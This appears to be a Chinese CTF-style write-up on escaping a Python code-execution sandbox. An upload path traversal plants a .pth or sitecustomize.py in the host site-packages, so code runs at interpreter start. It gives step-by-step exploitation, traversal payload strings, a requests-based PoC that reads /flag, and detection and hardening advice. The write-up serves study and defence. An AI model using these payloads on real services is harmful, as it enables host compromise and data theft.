## 一句话结论

Python 在线沙箱如果允许上传文件且路径可穿越到宿主机的 `site-packages`，就能写入恶意 `.pth` 或 `sitecustomize.py`；沙箱服务本身用宿主机的 `sys.executable` 启动 `launcher.py`，Python 在启动阶段会处理 `.pth` 中的 `import` 行并自动导入 `sitecustomize`，于是代码在 proot 沙箱真正执行目标脚本之前就在宿主机上运行，读取 flag 或反弹 shell。

## 原理

- 目标服务提供 `/upload` 与 `/run`：上传的 Python 文件保存到磁盘，`/run` 由 `server.py` 通过
  ```python
  subprocess.run([sys.executable, launcher_path, target_file], cwd=BASE_DIR, ...)
  ```
  启动。`launcher.py` 再用 proot 限制目标脚本的执行环境，但 **`launcher.py` 本身是由宿主机 Python 解释器启动的**，启动阶段已经加载宿主机的 `site` 配置。
- Python 的 `site.py` 在解释器初始化时会扫描 `site-packages` 下的 `.pth` 文件：空行/`#` 行忽略，以 `import ` 开头的行会被 `exec()`，其余行作为路径加入 `sys.path`。因此一行 `import os; os.system('cat /flag')` 就是启动即执行的代码。
- `site.py` 还会尝试 `import sitecustomize`；如果 `site-packages/sitecustomize.py` 存在，它会在解释器启动时被自动导入。攻击者上传同名文件到 `site-packages`，即可在沙箱脚本运行前执行。
- 上传接口若允许路径穿越（如 `../../../../../usr/local/lib/python3.10/site-packages/pwn.pth`），就能把文件写到宿主机的 site-packages；proot 只约束目标脚本的文件系统视图，不能阻止宿主解释器在启动时读取真实 site-packages。
- 另一条路径：沙箱内部可以连 `127.0.0.1:5000`（Flask 应用），`/run` 端点接受 `{"filename":"../../flag"}`，服务端把 flag 当 Python 文件执行，`SyntaxError` 会回显文件内容；这是“本地 Flask 路径遍历 + 报错泄露”的变体。
- 根因是“沙箱边界只包住目标脚本，没有包住启动它的宿主解释器”，加上“上传路径未限制 + Python 启动自加载机制”两个条件。

## 触发条件

- 在线 Python 沙箱/代码执行服务允许上传文件，且上传路径可穿越或可指定绝对路径。
- 服务用宿主机 Python 解释器启动 launcher/包装脚本，`site` 初始化未被 `-S` 禁用。
- `site-packages` 对 Web 进程可写（同用户/root 运行），或上传接口可直接写到该目录。
- 目标 Python 版本存在标准 `.pth`/`sitecustomize` 行为（默认都有）。
- 沙箱脚本能访问 flag 文件或能出网。

## 利用步骤

1. 探测沙箱环境：执行 `import sys, os; print(sys.version, os.getcwd(), os.listdir('.'), dict(os.environ))`，确认 Python 版本、`/app` 目录、容器/K8s 环境。
2. 尝试经典逃逸拿到 `os._wrap_close`/`popen`，确认能执行系统命令；若 `/app/run.py` 被 overlay/bind mount 劫持，读取到的可能是上传代码本身。
3. 探测 `site-packages` 路径（如 `/usr/local/lib/python3.10/site-packages`）与可写性。
4. 通过 `/upload` 的路径穿越写 `.pth`：
   ```text
   ../../../../../usr/local/lib/python3.10/site-packages/pwn.pth
   import os; print(os.popen('cat /flag').read()); import sys; sys.exit(0)
   ```
5. 或写 `sitecustomize.py` 到同一目录，内容读取 flag 并 `os._exit(0)`；下一次 `/run` 启动宿主解释器时自动执行。
6. 触发 `/run`，观察返回/回显；若 `.pth` 的 `import` 行导致 `SystemExit`，服务可能返回错误但 flag 已打印。
7. 变体：连本地 `127.0.0.1:5000` 的 `/run`，提交 `{"filename":"../../flag"}`，从 SyntaxError 中读 flag。

## PoC

```python
# 通过 /upload 写 .pth（路径按目标 site-packages 调整）
payload = "import os; print(os.popen('cat /flag').read()); import sys; sys.exit(0)\n"
files = {"file": ("pwn.pth", payload.encode())}
data = {"filename": "../../../../../usr/local/lib/python3.10/site-packages/pwn.pth"}
requests.post(f"{base}/upload", files=files, data=data)

# 触发宿主解释器启动
requests.post(f"{base}/run", json={"filename": "anything.py"})
```

`sitecustomize.py` 变体：

```python
import os, sys, subprocess
print(subprocess.getoutput('cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null'))
sys.stdout.flush(); os._exit(0)
```

上传到 `/usr/local/lib/python3.10/site-packages/sitecustomize.py`。

## 变体与关联

- **自加载变体**：`.pth` 的 `import` 行、`sitecustomize.py`、`usercustomize.py`、`PYTHONSTARTUP`（仅交互式）、`PYTHONPATH` 劫持。
- **写入变体**：上传路径穿越、任意文件写、日志写入、临时文件竞态；目标目录可能是宿主或容器内的 site-packages。
- **沙箱变体**：proot、Docker、K8s、seccomp、nsjail；关键看启动解释器/launcher 是否在沙箱外。
- **关联**：[[pentest-persistence-python-pth-sitepackages-autoload]]（`.pth` 启动持久化的机制与供应链案例）；[[ai-security-supply-chain-python-pth-addsitedir-model-disguise]]（`.pth`/`addsitedir` 的另一利用）；[[web-python-recursive-merge-class-pollution-globals-rce]]（Python 沙箱/对象污染的 RCE 链）。
- **边界**：上传路径被严格限制、site-packages 只读、解释器使用 `-S` 跳过 site、或沙箱用独立容器且不共享宿主 site-packages 时，本路径失效。

## 检测与防御

- **检测**：上传文件名/路径包含 `site-packages`、`.pth`、`sitecustomize.py`；Web 进程写入 Python 安装目录；子进程启动时加载非预期 `.pth`/`sitecustomize`。
- **防御**：上传目录固定、禁止路径穿越与绝对路径；沙箱用独立容器/只读根文件系统，不要把宿主 site-packages 暴露给沙箱；启动解释器加 `-S` 或使用隔离环境。
- **加固**：Web 进程降权，site-packages 只读；监控 Python 启动自加载文件；不要把 flag 放在沙箱可读的固定路径。
